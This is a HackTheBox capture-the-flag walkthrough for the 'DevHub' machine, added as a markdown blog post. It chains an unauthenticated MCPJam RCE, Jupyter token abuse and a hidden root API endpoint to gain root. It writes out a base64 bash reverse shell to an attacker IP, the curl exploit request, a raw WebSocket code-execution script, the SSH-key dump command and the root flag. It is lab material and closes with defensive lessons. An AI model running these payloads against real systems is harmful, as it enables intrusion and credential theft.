@@ -1,0 +1,312 @@
+---
+title: "DevHub Machine (HackTheBox) — Step-by-Step Walkthrough"
+date: "2026-06-15"
+draft: false
+locked: false
+tags: ["linux", "medium", "mcp", "rce", "jupyter", "lateral-movement", "privilege-escalation"]
+summary: "Compromise of a Linux machine via CVE-2026-23744, an unauthenticated RCE in MCPJam v1.4.2, followed by lateral movement through an exposed Jupyter Lab instance with a plaintext token, and privilege escalation via a hardcoded API key in an internal Flask service running as root."
+images: ["/static/images/devhub/devhub.png"]
+---
+
+
+
+![victory](/static/images/devhub/victory.png)
+
+---
+
+## Summary
+
+DevHub is a Linux machine centered around a development environment exposing an MCP (Model Context Protocol) Inspector server. The attack chain starts with exploiting CVE-2026-23744, an unauthenticated RCE in MCPJam v1.4.2, to land a shell as `mcp-dev`. From there, a Jupyter Lab instance running as `analyst` is discovered on an internal port — its authentication token is exposed in plaintext via process arguments. Jupyter's REST API and WebSocket protocol are abused to execute code as `analyst` and read the user flag. Privilege escalation to root comes from a Flask-based internal service (`OPSMCP`) running as root, whose source code reveals a hardcoded API key and an undocumented admin endpoint that dumps root's SSH private key.
+
+---
+
+## Table of Contents
+
+- [Reconnaissance](#reconnaissance)
+- [Web Enumeration](#web-enumeration)
+- [Foothold — RCE via CVE-2026-23744](#foothold)
+- [Lateral Movement — mcp-dev → analyst](#lateral-movement)
+- [User Flag](#user-flag)
+- [Privilege Escalation — analyst → root](#privilege-escalation)
+- [Root Flag](#root-flag)
+
+---
+
+## Reconnaissance
+
+```bash
+nmap -sCV 10.129.106.8 -oA devHub-htb
+```
+
+![devhub](/static/images/devhub/image%201.png)
+
+The scan returns two open ports: **22 (SSH)** and **80 (HTTP)**. SSH is a dead end at this stage — no credentials have been found and the machine provides none by default. Port 80 is the entry point.
+
+Before proceeding, the target IP is added to `/etc/hosts`:
+
+```bash
+echo "10.129.106.8   devhub.htb" | sudo tee -a /etc/hosts
+```
+
+> Note: The redirect operator `>>` runs as the current user, not as root, so using `sudo echo ... >> /etc/hosts` fails. `tee -a` is the correct approach since it runs under sudo.
+
+---
+
+## Web Enumeration
+
+![devhub](/static/images/devhub/image%202.png)
+
+The landing page on port 80 lists three internal platforms:
+
+- **MCP Inspector** — active on port `6274`
+- **Analytics Dashboard** — internal only, `localhost:8888`
+- **Code Repository** — internal Git server
+
+### MCP Inspector
+
+![devhub](/static/images/devhub/image%203.png)
+
+Navigating to the MCP Inspector and checking the settings tab reveals the server version: **MCPJam v1.4.2**.
+
+![devhub](/static/images/devhub/image%204.png)
+
+A quick search for this version reveals a critical unauthenticated RCE vulnerability: **CVE-2026-23744**. The advisory is documented at [https://github.com/advisories/GHSA-232v-j27c-5pp6](https://github.com/advisories/GHSA-232v-j27c-5pp6).
+
+The root cause is that the MCP Inspector accepts arbitrary `command` and `args` via its `/api/mcp/connect` endpoint and spawns them as a child process without any validation or authentication. By default, it also binds to `0.0.0.0` instead of `127.0.0.1`, making it externally reachable.
+
+---
+
+## Foothold
+
+### Setting Up the Listener
+
+```bash
+nc -lvnp 1234
+```
+
+### Crafting the Payload
+
+Direct use of shell redirects (`>&`) in the JSON payload can cause issues because `/dev/tcp` is a bash-only feature — it does not exist in `sh`. To work around this, the reverse shell command is base64-encoded and piped through bash at execution time:
+
+```bash
+echo "bash -c 'sh -i >& /dev/tcp/10.10.16.26/1234 0>&1'" | base64 -w0
+# Output: YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjYvMTIzNCAwPiYxJwo=
+```
+
+The outer shell (`sh -c`) decodes and pipes the payload into `bash`, ensuring `/dev/tcp` is interpreted correctly.
+
+### Triggering RCE
+
+```bash
+curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{
+    "serverConfig": {
+      "command": "sh",
+      "args": ["-c", "echo YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjYvMTIzNCAwPiYxJwo= | base64 -d | bash"],
+      "env": {}
+    },
+    "serverId": "root"
+  }'
+```
+
+### Initial Shell as `mcp-dev`
+
+![devhub](/static/images/devhub/image%206.png)
+
+A reverse shell lands as `mcp-dev`. The shell is then stabilized using Python's pty module:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+```
+
+Landing directory: `/opt/mcpjam/node_modules/@mcpjam/inspector`
+
+---
+
+## Lateral Movement
+
+### Process Enumeration
+
+With a foothold on the box, internal services are enumerated to find paths to other users:
+
+```bash
+ps aux | grep -E "jupyter|opsmcp"
+```
+
+![devhub](/static/images/devhub/image%207.png)
+
+Two services are found running on loopback (`127.0.0.1`), inaccessible externally but reachable from the current shell:
+
+- **Port 8888** — Jupyter Lab running as `analyst`
+- **Port 5000** — OPSMCP Flask server running as `root`
+
+Jupyter Lab is the immediate target since it runs as `analyst` and its authentication token is visible in plaintext in the process arguments — a consequence of how Jupyter passes the token as a CLI flag at startup.
+
+### Confirming Jupyter Access
+
+The extracted token is used to verify API access and list available notebooks:
+
+```bash
+curl -s "http://localhost:8888/api/contents?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+```
+
+Response confirms one notebook: `quarterly_analysis.ipynb`. The API is live and the token is valid.
+
+### Creating a Kernel
+
+Jupyter's code execution model works in two stages: first a kernel (Python interpreter) is created via the REST API, then code is sent to it over a WebSocket connection. The kernel runs as the user who owns the Jupyter process — in this case, `analyst`.
+
+```bash
+curl -s -X POST "http://localhost:8888/api/kernels?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
+  -H "Content-Type: application/json" \
+  -d '{}'
+```
+
+Response:
+```json
+{"id": "65ab938e-944f-44b8-a973-77356ae34c50", "name": "python3", "execution_state": "starting"}
+```
+
+### Executing Code via WebSocket
+
+Jupyter does not accept code execution over HTTP — all kernel communication happens over WebSocket on the `/api/kernels/<id>/channels` endpoint. Since `websocket-client` was not available on the machine, the WebSocket handshake and frame format are implemented manually using raw sockets.
+
+**WebSocket frame structure (client → server):**
+- `0x81` — FIN bit set, opcode 1 (text frame)
+- Length byte(s) — 1 byte for ≤125, 3 bytes for ≤65535, 9 bytes for larger
+- 4-byte masking key — client-to-server frames must be masked per RFC 6455
+- Masked payload — each byte XOR'd with the corresponding masking key byte
+
+```python
+python3 << 'EOF'
+import socket, base64, os, json, struct, uuid, time
+
+TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+KERNEL_ID = "65ab938e-944f-44b8-a973-77356ae34c50"
+
+key = base64.b64encode(os.urandom(16)).decode()
+upgrade = (
+    f"GET /api/kernels/{KERNEL_ID}/channels?token={TOKEN} HTTP/1.1\r\n"
+    f"Host: localhost:8888\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+    f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
+)
+
+s = socket.socket()
+s.connect(("localhost", 8888))
+s.send(upgrade.encode())
+s.recv(4096)  # discard 101 Switching Protocols
+
+msg = json.dumps({
+    "header": {"msg_id": str(uuid.uuid4()), "msg_type": "execute_request",
+               "username": "", "session": str(uuid.uuid4()), "version": "5.0"},
+    "parent_header": {}, "metadata": {},
+    "content": {"code": "import os; os.system('cat /home/analyst/user.txt > /tmp/flag.txt')", "silent": False}
+})
+
+payload = msg.encode()
+length = len(payload)
+mask_key = os.urandom(4)
+masked = bytearray([payload[i] ^ mask_key[i % 4] for i in range(length)])
+
+if length <= 125:
+    header = struct.pack('!BB', 0x81, 0x80 | length) + mask_key
+elif length <= 65535:
+    header = struct.pack('!BBH', 0x81, 0xFE, length) + mask_key
+else:
+    header = struct.pack('!BBQ', 0x81, 0xFF, length) + mask_key
+
+s.send(header + masked)
+time.sleep(5)
+EOF
+```
+
+---
+
+## User Flag
+
+```bash
+cat /tmp/flag.txt
+```
+
+![devhub](/static/images/devhub/image%208.png)
+
+---
+
+## Privilege Escalation
+
+### Reading the OPSMCP Source
+
+The OPSMCP Flask service on port 5000 runs as root and requires an `X-API-Key` header. Direct file access to `/opt/opsmcp/server.py` is not available as `mcp-dev`, but the Jupyter kernel running as `analyst` can read it. The same WebSocket execution technique is reused with a different payload:
+
+```python
+"code": "import os; os.system('cat /opt/opsmcp/server.py > /tmp/src.txt')"
+```
+
+```bash
+cat /tmp/src.txt
+```
+
+Source code review reveals two critical findings:
+
+- **Hardcoded API key:** `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
+- **Hidden tool:** `ops._admin_dump` — not listed in `/tools/list` but callable via `/tools/call`. It accepts `target=ssh_keys` and reads `/root/.ssh/id_rsa` directly, since the process runs as root.
+
+This is a classic security-through-obscurity failure: the endpoint is undocumented but fully functional and unprotected beyond the shared API key.
+
+### Dumping the Root SSH Key
+
+```bash
+curl -s -X POST "http://localhost:5000/tools/call" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
+```
+
+![devhub](/static/images/devhub/image%209.png)
+
+The response contains root's RSA private key.
+
+### SSH as Root
+
+```bash
+cat > /tmp/root_key << 'EOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+<key data>
+-----END OPENSSH PRIVATE KEY-----
+EOF
+chmod 600 /tmp/root_key
+ssh -i /tmp/root_key root@localhost
+```
+
+---
+
+## Root Flag
+
+```bash
+root@devhub:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@devhub:~# cat root.txt
+e5eb4e369300d429c7d99c663621865e
+```
+
+---
+
+## Attack Chain Summary
+
+| Step | Technique | From → To |
+|------|-----------|-----------|
+| Foothold | CVE-2026-23744 — unauthenticated RCE in MCPJam v1.4.2 | External → `mcp-dev` |
+| Lateral Movement | Jupyter token in process args → WebSocket kernel code execution | `mcp-dev` → `analyst` |
+| Privilege Escalation | Hardcoded API key + hidden admin endpoint in OPSMCP → root SSH key | `analyst` → `root` |
+
+---
+
+## Key Takeaways
+
+- **Secrets in process arguments are world-readable** via `ps aux` and `/proc/<pid>/cmdline`. Tokens and credentials should be passed via environment variables or config files with restricted permissions.
+- **Jupyter is RCE by design.** A valid token grants full code execution as the owning user. Jupyter should never run on a network-accessible interface without additional auth layers.
+- **Security through obscurity is not access control.** Hidden API endpoints are discoverable through source code review and provide no real protection.
+- **Services running as root with no privilege separation** turn any code execution bug into full compromise.
